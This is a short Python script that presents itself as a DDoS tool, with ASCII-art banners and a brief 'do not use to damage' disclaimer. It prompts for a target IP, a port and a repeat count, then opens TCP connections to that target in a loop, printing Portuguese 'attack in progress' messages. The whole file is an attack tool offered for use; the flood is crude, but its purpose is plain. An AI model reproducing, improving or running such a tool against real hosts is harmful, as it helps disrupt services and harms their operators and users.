# The Witch DDoS TOOL
# a DDoS tool, made for recreation, do not use to damage someone or something
# Developer: MaybeIcallPeter


from colorama import init
from termcolor import colored
from os import system as s
from random import randint
from time import sleep
import socket
import sys
import os

init()

print(colored("""

 ██╗       ██╗██╗████████╗ █████╗ ██╗  ██╗      ██████╗ ██████╗  █████╗  ██████╗
 ██║  ██╗  ██║██║╚══██╔══╝██╔══██╗██║  ██║      ██╔══██╗██╔══██╗██╔══██╗██╔════╝
 ╚██╗████╗██╔╝██║   ██║   ██║  ╚═╝███████║      ██║  ██║██║  ██║██║  ██║╚█████╗
  ████╔═████║ ██║   ██║   ██║  ██╗██╔══██║      ██║  ██║██║  ██║██║  ██║ ╚═══██╗
  ╚██╔╝ ╚██╔╝ ██║   ██║   ╚█████╔╝██║  ██║      ██████╔╝██████╔╝╚█████╔╝██████╔╝
   ╚═╝   ╚═╝  ╚═╝   ╚═╝    ╚════╝ ╚═╝  ╚═╝      ╚═════╝ ╚═════╝  ╚════╝ ╚═════╝""", "green"))
print('a DDoS tool, by: Ferne')
print(colored('do not use to damage someone or something', "red"))

print('\n\nENTER[enter]')
print('\nEXIT[exit]')

print(colored('enter option to continue', 'green'))

choice = input("?: ")

if choice.lower() == "exit":
	quit()

if choice.lower() == "enter":
	for i in range(0,10):
		sleep(0.05)
		print(colored('LETS TARGET!!', "red"))
s('cls')

print(colored("""

████████╗ █████╗ ██████╗  ██████╗ ███████╗████████╗
╚══██╔══╝██╔══██╗██╔══██╗██╔════╝ ██╔════╝╚══██╔══╝
   ██║   ███████║██████╔╝██║  ██╗ █████╗     ██║
   ██║   ██╔══██║██╔══██╗██║  ╚██╗██╔══╝     ██║
   ██║   ██║  ██║██║  ██║╚██████╔╝███████╗   ██║
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝

                        █   █▀█ █ █ █▄ █ █▀▀ █▀▀
                        █▄▄ █▄█ █▄█ █ ▀█ █▄█ ██▄""", "red"))

count = 0

ip1 = input("IP:")

port2 = int(input("PORT:"))

main3 = int(input("MAIN:"))

print(colored("""
╭━━━┳━━━╮  ╭━━━╮
╰╮╭╮┣╮╭╮┃  ┃╭━╮┃
 ┃┃┃┃┃┃┃┣━━┫╰━━╮
 ┃┃┃┃┃┃┃┃╭╮┣━━╮┃
╭╯╰╯┣╯╰╯┃╰╯┃╰━╯┃
╰━━━┻━━━┻━━┻━━━╯""", "red"))

def attack(ip, port):
		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		client.settimeout(0.30)
		code = client.connect_ex((ip, port))
		if code == 0:
				print(colored("[==>] - Realizando o ataque.", "green"))
				print(f"IP: {ip}, PORT: {port}")
		else:
				print(colored("Servidor indisponivel ou Porta fechada!\n", "red"))



while count < main3:
	count+=1
	attack(ip1,port2)
print(colored("[!] DDoS Parado.", "red"))